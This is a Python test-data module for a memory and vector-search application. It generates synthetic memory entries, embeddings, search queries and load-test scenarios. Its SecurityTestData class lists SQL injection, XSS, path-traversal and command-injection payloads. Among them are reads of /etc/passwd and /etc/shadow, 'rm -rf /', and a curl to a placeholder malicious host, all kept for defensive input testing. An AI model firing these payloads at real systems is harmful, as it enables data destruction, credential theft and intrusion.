"""
Test data fixtures and utilities for MemoryLink test suite.
Provides comprehensive test data for various scenarios.
"""

from typing import Dict, List, Any
import json
import random
from datetime import datetime, timedelta
import numpy as np


class TestDataGenerator:
    """Generate realistic test data for memory operations."""
    
    @staticmethod
    def generate_memory_content(length: str = "medium") -> str:
        """Generate realistic memory content of various lengths."""
        base_content = {
            "short": [
                "Meeting with John about project deadline",
                "Remember to buy groceries",
                "Important insight about user behavior",
                "Bug fix needed in authentication module",
                "Great idea for new feature implementation"
            ],
            "medium": [
                "Today's team standup revealed several interesting points about our current sprint progress. The authentication service is performing well but we need to optimize the search functionality for better user experience.",
                "Attended a fascinating conference talk about vector databases and their applications in modern AI systems. Key takeaway: embedding quality matters more than model complexity for retrieval tasks.",
                "Code review session highlighted the importance of proper error handling in async operations. Several team members suggested implementing circuit breaker patterns for external service calls.",
                "User feedback analysis shows that our search feature is being used differently than expected. Users prefer semantic search over exact keyword matching, which validates our vector approach.",
                "Performance testing results indicate that our current architecture can handle up to 1000 concurrent users, but we'll need horizontal scaling for enterprise deployments."
            ],
            "long": [
                "Comprehensive analysis of our Q3 performance metrics reveals significant improvements in user engagement and system reliability. The implementation of vector-based memory search has increased user satisfaction scores by 23% compared to traditional keyword search approaches. Technical debt reduction efforts have paid off with a 40% decrease in production incidents and 15% improvement in deployment frequency. Key challenges moving forward include scaling our embedding generation pipeline to handle increased load and implementing more sophisticated ranking algorithms. The development team has proposed a three-phase approach: Phase 1 focuses on infrastructure optimization and caching improvements, Phase 2 introduces advanced ML models for better semantic understanding, and Phase 3 implements real-time personalization features. Budget considerations suggest we should prioritize Phase 1 initiatives while preparing for Phase 2 implementation in Q4. Risk assessment indicates minimal impact on existing functionality with proper feature flagging and gradual rollout strategies.",
                "Deep dive into modern software architecture patterns and their practical applications in distributed systems design. Microservices architecture continues to dominate enterprise solutions but introduces complexity in service mesh management, data consistency, and cross-service communication. Event-driven architecture patterns show promise for decoupling services and improving system resilience. The combination of CQRS (Command Query Responsibility Segregation) with event sourcing provides excellent audit capabilities and enables temporal queries, though it requires careful consideration of eventual consistency trade-offs. Container orchestration with Kubernetes has become the de facto standard, but proper resource management and monitoring remain challenging. Observability through distributed tracing, metrics collection, and structured logging is crucial for maintaining system health in production environments. Security considerations must be baked into the architecture from the ground up, including proper authentication, authorization, encryption at rest and in transit, and regular security audits."
            ]
        }
        
        content_list = base_content.get(length, base_content["medium"])
        return random.choice(content_list)
    
    @staticmethod
    def generate_tags(count: int = None) -> List[str]:
        """Generate realistic tags for memories."""
        tag_pool = [
            "work", "personal", "ideas", "meeting", "project", "deadline", 
            "bug", "feature", "architecture", "performance", "security",
            "ai", "ml", "database", "api", "frontend", "backend",
            "urgent", "important", "review", "documentation", "testing",
            "deployment", "monitoring", "optimization", "research",
            "conference", "learning", "insight", "feedback", "analysis"
        ]
        
        if count is None:
            count = random.randint(1, 5)
        
        return random.sample(tag_pool, min(count, len(tag_pool)))
    
    @staticmethod
    def generate_metadata() -> Dict[str, Any]:
        """Generate realistic metadata for memories."""
        return {
            "importance": random.choice(["low", "medium", "high", "urgent"]),
            "category": random.choice(["work", "personal", "idea", "task", "note"]),
            "project": random.choice(["MemoryLink", "VectorDB", "SearchAPI", None]),
            "created_by": random.choice(["user1", "user2", "user3"]),
            "version": random.randint(1, 10),
            "reviewed": random.choice([True, False])
        }
    
    @classmethod
    def generate_memory_entry(cls, 
                            content_length: str = "medium",
                            include_tags: bool = True,
                            include_metadata: bool = True) -> Dict[str, Any]:
        """Generate a complete memory entry."""
        entry = {
            "id": f"mem_{random.randint(100000, 999999)}",
            "content": cls.generate_memory_content(content_length),
            "timestamp": (datetime.now() - timedelta(
                days=random.randint(0, 365),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59)
            )).isoformat()
        }
        
        if include_tags:
            entry["tags"] = cls.generate_tags()
        
        if include_metadata:
            entry["metadata"] = cls.generate_metadata()
        
        return entry
    
    @classmethod
    def generate_memory_dataset(cls, size: int, **kwargs) -> List[Dict[str, Any]]:
        """Generate a dataset of memory entries."""
        return [cls.generate_memory_entry(**kwargs) for _ in range(size)]


class EmbeddingTestData:
    """Generate and manage embedding test data."""
    
    @staticmethod
    def generate_random_embedding(dimension: int = 384) -> List[float]:
        """Generate a random normalized embedding vector."""
        vector = np.random.randn(dimension)
        norm = np.linalg.norm(vector)
        return (vector / norm).tolist() if norm > 0 else vector.tolist()
    
    @staticmethod
    def generate_similar_embeddings(base_embedding: List[float], 
                                  count: int = 3,
                                  similarity_range: tuple = (0.7, 0.9)) -> List[List[float]]:
        """Generate embeddings similar to a base embedding."""
        base_array = np.array(base_embedding)
        similar_embeddings = []
        
        for _ in range(count):
            # Add small random noise to create similar vectors
            noise_scale = random.uniform(0.1, 0.3)
            noise = np.random.randn(len(base_embedding)) * noise_scale
            similar_vector = base_array + noise
            
            # Normalize to maintain vector properties
            norm = np.linalg.norm(similar_vector)
            similar_vector = similar_vector / norm if norm > 0 else similar_vector
            
            similar_embeddings.append(similar_vector.tolist())
        
        return similar_embeddings
    
    @staticmethod
    def calculate_cosine_similarity(vec1: List[float], vec2: List[float]) -> float:
        """Calculate cosine similarity between two vectors."""
        a = np.array(vec1)
        b = np.array(vec2)
        return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))


class SecurityTestData:
    """Generate security-focused test data."""
    
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE memories; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "'; INSERT INTO memories VALUES ('hacked'); --",
        "1'; UPDATE memories SET content='hacked' WHERE id=1; --"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
        "<iframe src=javascript:alert('xss')></iframe>",
        "<svg onload=alert('xss')></svg>"
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "& cat /etc/passwd",
        "| whoami",
        "`rm -rf /`",
        "$(cat /etc/shadow)",
        "&& curl malicious-site.com"
    ]
    
    @classmethod
    def get_malicious_inputs(cls) -> Dict[str, List[str]]:
        """Get dictionary of malicious input categories."""
        return {
            "sql_injection": cls.SQL_INJECTION_PAYLOADS,
            "xss": cls.XSS_PAYLOADS,
            "command_injection": cls.COMMAND_INJECTION_PAYLOADS,
            "oversized_input": ["x" * (10**6)],  # 1MB string
            "null_bytes": ["test\x00malicious"],
            "unicode_attacks": ["../../etc/passwd", "..\\..\\windows\\system32"]
        }


class PerformanceTestData:
    """Generate performance test data and scenarios."""
    
    @staticmethod
    def generate_load_test_memories(count: int) -> List[Dict[str, Any]]:
        """Generate memories for load testing."""
        return TestDataGenerator.generate_memory_dataset(
            size=count,
            content_length="medium",
            include_tags=True,
            include_metadata=True
        )
    
    @staticmethod
    def generate_search_queries(count: int) -> List[str]:
        """Generate realistic search queries for performance testing."""
        query_templates = [
            "machine learning algorithms",
            "project deadline meeting",
            "authentication bug fix",
            "database optimization",
            "user interface design",
            "api endpoint security",
            "performance monitoring",
            "code review process",
            "deployment strategy",
            "vector database implementation"
        ]
        
        queries = []
        for _ in range(count):
            base_query = random.choice(query_templates)
            # Add variations
            if random.random() < 0.3:
                base_query += " optimization"
            if random.random() < 0.2:
                base_query += " best practices"
            
            queries.append(base_query)
        
        return queries
    
    @staticmethod
    def generate_concurrent_scenarios() -> Dict[str, Any]:
        """Generate scenarios for concurrent testing."""
        return {
            "mixed_operations": {
                "add_memories": 30,
                "search_queries": 50,
                "get_memories": 20,
                "update_memories": 10
            },
            "read_heavy": {
                "add_memories": 5,
                "search_queries": 80,
                "get_memories": 15,
                "update_memories": 0
            },
            "write_heavy": {
                "add_memories": 60,
                "search_queries": 20,
                "get_memories": 10,
                "update_memories": 10
            }
        }


# Predefined test datasets
SAMPLE_MEMORIES = TestDataGenerator.generate_memory_dataset(50)
SAMPLE_EMBEDDINGS = [EmbeddingTestData.generate_random_embedding(384) for _ in range(50)]
SECURITY_TEST_VECTORS = SecurityTestData.get_malicious_inputs()
PERFORMANCE_QUERIES = PerformanceTestData.generate_search_queries(100)

# Export commonly used test data
__all__ = [
    "TestDataGenerator",
    "EmbeddingTestData", 
    "SecurityTestData",
    "PerformanceTestData",
    "SAMPLE_MEMORIES",
    "SAMPLE_EMBEDDINGS",
    "SECURITY_TEST_VECTORS",
    "PERFORMANCE_QUERIES"
]